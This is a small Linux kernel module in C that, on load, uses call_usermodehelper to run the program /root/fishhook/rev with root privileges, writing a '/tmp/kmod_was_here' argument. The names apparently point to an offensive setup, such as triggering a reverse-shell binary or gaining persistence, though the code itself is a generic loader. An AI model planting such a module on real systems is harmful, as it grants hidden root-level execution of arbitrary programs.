#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Section E");
MODULE_DESCRIPTION("A kernel module to launch a user-space program on load");
MODULE_VERSION("1.0");

static char *target_program = "/root/fishhook/rev";
static char *target_arg = "/tmp/kmod_was_here";

static int run_usermode_process(void)
{
    int result;
    char *argv[] = { target_program, target_arg, NULL };

    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    printk(KERN_INFO "kmod_launcher: Attempting to run %s %s\n", target_program, target_arg);

    result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    if (result < 0) {
        printk(KERN_ERR "kmod_launcher: Error executing command. Code: %d\n", result);
    } else {
        printk(KERN_INFO "kmod_launcher: Command executed successfully.\n");
    }

    return result;
}

static int __init kmod_launcher_init(void)
{
    printk(KERN_INFO "kmod_launcher: Module loaded.\n");
    return run_usermode_process();
}

static void __exit kmod_launcher_exit(void)
{
    printk(KERN_INFO "kmod_launcher: Module unloaded.\n");
}

module_init(kmod_launcher_init);
module_exit(kmod_launcher_exit);
